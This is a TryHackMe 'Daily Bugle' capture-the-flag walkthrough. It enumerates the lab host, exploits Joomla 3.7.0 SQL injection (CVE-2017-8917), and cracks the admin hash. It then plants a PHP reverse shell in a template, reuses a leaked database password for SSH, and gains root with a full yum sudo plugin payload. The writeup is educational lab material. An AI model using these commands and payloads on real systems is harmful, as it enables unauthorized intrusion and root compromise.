# TryHackMe – Daily Bugle Walkthrough

![image.png](image.png)

## Introduction

The **Daily Bugle** room on TryHackMe drops you into the middle of a Red Team investigation inspired by a high-profile bank robbery. The goal is to track the attackers by following their digital trail through a vulnerable Joomla CMS installation and ultimately compromise the underlying Red Hat Linux system.

## Port Enumeration

As always, the first step is to identify the exposed ports on the target.

```json
nmap 10.64.149.242 -sT -T5 -vvv -p-
```

Result:

```json
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3306/tcp open  mysql   syn-ack
```

Three services stand out:

- **22 (SSH)** – potential remote access
- **80 (HTTP)** – web application, likely our main entry point
- **3306 (MySQL/MariaDB)** – database service, possibly exploitable through the web app

## Service Enumeration

Next, we enumerate versions:

```json
nmap 10.64.149.242 -sV -T5 -vvv -p 22,80,3306
```

Result:

```json
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    syn-ack ttl 62 Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   syn-ack ttl 62 MariaDB 10.3.23 or earlier (unauthorized)
```

The presence of Apache with PHP suggests a CMS-driven web application.

## Web Enumeration

Opening `http://10.64.149.242` in the browser reveals a website.

![image.png](image%201.png)

To understand its structure, I performed directory brute-forcing:

```json
gobuster dir -u http://10.64.149.242 \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt \
-x php,html,js,txt
```

Results:

```
/administrator
/README.txt
/LICENSE.txt
/configuration.php
/components
/templates
/plugins
```

Visiting `/administrator` presented us with the Joomla admin login page.

![image.png](image%202.png)

Checking `/README.txt` reveals:

```
Joomla! 3.7.0
```

This is a critical discovery because **Joomla 3.7.0 is vulnerable to CVE-2017-8917**, an unauthenticated SQL injection vulnerability.

## **Exploiting CVE-2017-8917 (SQL Injection)**

This vulnerability allows extraction of database contents without authentication.

I used the following exploit:

[https://github.com/BaptisteContreras/CVE-2017-8917-Joomla/blob/master/main.py](https://github.com/BaptisteContreras/CVE-2017-8917-Joomla/blob/master/main.py)

Running it against the target dumps sensitive information from the Joomla database, including user credentials.

Running it against the target dumps sensitive Joomla data, including user hashes:

```json
jonah@tryhackme.com:$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```

## Password Cracking

The `$2y$` prefix indicates a **bcrypt** hash. Using John the Ripper:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Result:

```
spiderman123
```

Recovered credentials:

```
Username: jonah@tryhackme.com
Password: spiderman123
```

## Joomla Admin Access

Using the cracked credentials, we successfully log into the Joomla administrator panel:

```
http://10.64.149.242/administrator
```

![image.png](image%203.png)

## Gaining a Reverse Shell

Once inside, I navigated to **Extensions > Templates > Templates** and selected the **Beez3** template.

![image.png](image%204.png)

Generated a PHP reverse shell from the web

[Online - Reverse Shell Generator](https://www.revshells.com/)

Inserted the payload on the `index.php`

![image.png](image%205.png)

I set up a listener:

```json
nc -lnvp 4444
```

Triggered the shell by visiting:

```json
http://10.64.176.202/templates/beez3/index.php
```

We receive a shell as the Apache user:

![image.png](image%206.png)

## Credential Harvesting

While exploring the Joomla directory:

```bash
cd /var/www/html
cat configuration.php
```

We discover database credentials:

```php
public$password ='nv5uz9r3ZEDzVjNu';
public$db ='joomla';
public$mailfrom ='jonah@tryhackme.com';
```

## **SSH Access & User Flag**

Testing SSH access:

```bash
ssh jonah@10.64.149.242
```

This fails. Trying another user:

```bash
ssh jjameson@10.64.149.242
```

Using the same password:

```
nv5uz9r3ZEDzVjNu
```

Login is successful.

![image.png](image%207.png)

Retrieved the user flag:

```json
cat user.txt 
27a............42e
```

## Privilege Escalation

Check sudo privileges:

```bash
sudo -l
```

```
(ALL) NOPASSWD: /usr/bin/yum
```

Allowing unrestricted `yum` execution as root is extremely dangerous.

`yum` supports plugins, which can be abused to execute arbitrary commands.

With a google search i found a payload to use the escalate privileges using yum

```json
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

With that i was able to get a root shell

![image.png](image%208.png)

Captured the root flag:

```json
cat root.txt 
ee..........f79
```